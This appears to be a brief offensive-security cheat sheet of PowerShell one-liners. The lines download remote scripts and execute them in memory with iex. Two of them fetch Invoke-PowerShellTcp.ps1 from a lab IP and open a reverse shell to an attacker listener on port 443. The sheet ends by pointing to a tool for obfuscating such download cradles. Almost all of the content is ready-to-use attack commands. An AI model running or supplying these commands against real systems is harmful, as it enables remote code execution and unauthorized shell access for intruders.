## Run a remotely hosted script into memory
`iex (iwr http://<webserver/script.ps1 -UseBasicParsing`

## Download file from remote host
`iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`

 - Downloades InvokePowerShellTCP.ps1 and then runs it to connect to a listener on Attacker machine
`powershell.exe -c iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443`

`powershell.exe -c iex (iwr http://172.16.100.X/Invoke-PowerShellTcp.ps1 -UseBasicParsing);Invoke-PowerShellTcp -Reverse -IPAddress 172.16.100.X -Port 443`

## Resource:
https://github.com/danielbohannon/Invoke-CradleCrafter